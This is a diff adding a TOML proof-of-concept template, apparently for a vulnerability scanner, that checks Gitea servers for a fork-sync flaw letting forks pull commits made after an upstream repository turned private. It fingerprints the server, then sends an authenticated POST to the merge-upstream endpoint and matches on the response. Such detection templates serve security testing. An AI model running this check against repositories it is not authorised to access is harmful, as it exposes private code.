@@ -1,0 +1,55 @@
+[info]
+author = "ave"
+description = "验证 Gitea 1.26.2 及之前版本中 fork 同步绕过私有权限检查漏洞。当上游仓库从公开变更为私有后，通过 POST /api/v1/repos/{owner}/{repo}/merge-upstream 接口仍可同步私有期间提交的代码。PoC 先确认目标运行 Gitea，再尝试以 fork 身份调用 merge-upstream 接口，若返回 200 则说明存在信息泄露风险。"
+id = "POC-AVE-2026-0250"
+name = "Gitea 仓库分叉同步信息泄露漏洞 PoC"
+severity = "high"
+tags = ["ave-2026-0250"]
+vuln_id = [
+    "CVE-2026-24451",
+    "AVE-2026-0250",
+    "GHSA-wrf9-r3h7-7x5v",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/api/v1/version"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["version"]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/v1/repos/{{parent_owner}}/{{parent_repo}}/merge-upstream"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"head":"{{fork_branch}}"}'
+type = "json"
+
+[poc.requests.headers]
+Authorization = "token {{gitea_token}}"
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["base_branch"]
